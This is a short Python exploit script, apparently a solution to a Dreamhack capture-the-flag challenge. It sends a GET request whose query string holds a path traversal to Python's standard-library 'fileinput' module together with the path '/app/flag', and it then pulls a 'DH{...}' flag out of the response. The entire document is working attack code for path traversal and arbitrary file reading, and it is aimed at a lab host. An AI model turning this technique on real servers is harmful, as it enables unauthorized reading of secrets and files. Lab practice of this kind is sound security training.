import re
import sys
import urllib.parse
import urllib.request

class Exploit:
    def __init__(self, baseURL, stdlib="usr/local/lib/python3.11", flagpath="/app/flag"):
        self.baseURL = baseURL
        self.stdlib = stdlib
        self.flagpath = flagpath
    
    def buid_url(self):
        arg1 = f"../../../{self.stdlib}/fileinput"
        arg2 = f"{self.flagpath}"
        url_parse = urllib.parse.quote(arg1, safe="/.-_") + "&" + urllib.parse.quote(arg2, safe="/.-_")
        return f"{self.baseURL}/?{url_parse}"
    
    def http_get(self, url, timeout=8):
        request = urllib.request.Request(url, method="GET")
        with urllib.request.urlopen(request, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            return resp.getcode(), body
        
    def get_flag(self, text):
        flag = re.search(r"(DH\{[^\n\r}]*\})", text)
        if flag:
            return flag.group(1)
        return None
    
    def run(self):
        url = self.buid_url()
        print(f"[*] Trying: {url}")
        try:
            code, body = self.http_get(url)
        except Exception as e:
            print(f"[-] Request failed: {e}")
            return False
        
        flag = self.get_flag(body)
        if flag:
            print(f"[+] Done Flag Here: \n", flag)
            return True
        else:
            print(f"[-] Failed Get Flag")
            return False
if __name__ == "__main__":
    BASE_URL = "http://host1.dreamhack.games:13575"
    exploit = Exploit(BASE_URL)
    exploit.run()


    